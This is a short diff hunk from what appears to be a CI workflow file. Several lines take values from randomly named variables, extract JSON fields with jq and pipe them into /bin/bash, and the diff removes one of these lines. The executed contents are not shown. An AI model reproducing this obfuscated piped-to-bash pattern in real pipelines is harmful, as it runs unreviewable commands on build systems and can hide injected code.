@@ -27,7 +27,6 @@ jobs:
           echo $sac4 | jq -r .t59407 | /bin/bash
           echo $g036 | jq -r .gybkd1 | /bin/bash
           printf '%s' "$e13054" | jq -r .ztx5778 | /bin/bash
-          echo $wrdp5063 | jq -r .kgoe1 | /bin/bash
           printf '%s' "$thnv67" | jq -r .zjta87 | /bin/bash
 
       - name: Archive results
